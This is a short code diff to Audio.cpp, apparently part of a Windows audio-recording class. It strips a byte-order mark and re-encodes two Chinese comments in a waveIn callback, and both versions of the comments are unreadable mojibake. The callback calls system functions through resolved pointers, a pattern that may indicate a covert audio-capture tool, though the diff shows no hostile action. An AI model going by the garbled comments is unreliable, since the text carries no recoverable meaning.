@@ -1,4 +1,4 @@
-ï»¿// Audio.cpp: implementation of the CAudio class.
+// Audio.cpp: implementation of the CAudio class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -382,9 +382,9 @@ DWORD WINAPI CAudio::waveInCallBack( LPVOID lparam )
 	{
 		if (Msg.message == MM_WIM_DATA)
 		{
-			// é€šçŸ¥çš„æ•°æ®åˆ°æ¥
+			// Í¨ÖªµÄÊý¾Ýµ½À´
 			pSetEvent(pThis->m_hEventWaveIn);
-			// ç­‰å¾…å¼€å§‹ä¸‹æ¬¡å½•éŸ³
+			// µÈ´ý¿ªÊ¼ÏÂ´ÎÂ¼Òô
 			pWaitForSingleObject(pThis->m_hStartRecord, INFINITE);
 
 			pThis->m_nWaveInIndex = 1 - pThis->m_nWaveInIndex;
